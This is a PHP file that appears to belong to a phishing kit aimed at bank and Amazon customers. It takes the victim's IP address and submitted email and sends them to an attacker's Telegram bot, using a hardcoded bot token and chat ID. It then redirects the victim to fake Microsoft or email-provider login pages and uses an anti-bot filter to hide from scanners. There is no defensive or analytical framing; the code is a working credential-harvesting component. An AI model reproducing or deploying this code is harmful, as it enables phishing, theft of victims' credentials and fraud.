<?php

    session_start();
$ip = getenv("REMOTE_ADDR");
$message = " ————————— RBC ROYAL ———— ";
$message = "LOG - location = : $ip ";
$message = "———————— AMAZON $404  ————";
$message .="location $ip";
$message .="- Email       : ".$_POST['email']."\n";
$message .= ".---------- DOOZ 777 WAS HERE -------------.";
$apiToken = "6367658316:AAGCLcSi0wH86XPd6jWnW6gXm-UjSmtktrw";
$usaabank = [
	    'chat_id' => '6239366940',
	    'text' => $message
	];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($usaabank) );

    require_once 'Comp.php';

    $comps = new Comp;

    $settings = $comps->settings();

    if (isset(
        $_POST['email']
    )) {
        if (!$comps->checkEmpty(
            $_POST['email']
        )) {
            $_SESSION['email'] = $_POST['email'];

            if (!$comps->userEmail($_SESSION['email'])) {
                $comps->headerX("./Microsoft.php");
            } else {
                $comps->headerX("./" . $comps->userEmail($_SESSION['email']) . ".php");
            }
        } else {
            echo $antibot->throw404();
            $comps->log(
                "../../Guard/Audio/kill.txt",
                "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Empty Input\n\n"
            );
            die();
        }
    } else {
        echo $antibot->throw404();
        $comps->log(
            "../../Guard/Audio/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Empty Input\n\n"
        );
        die();
    }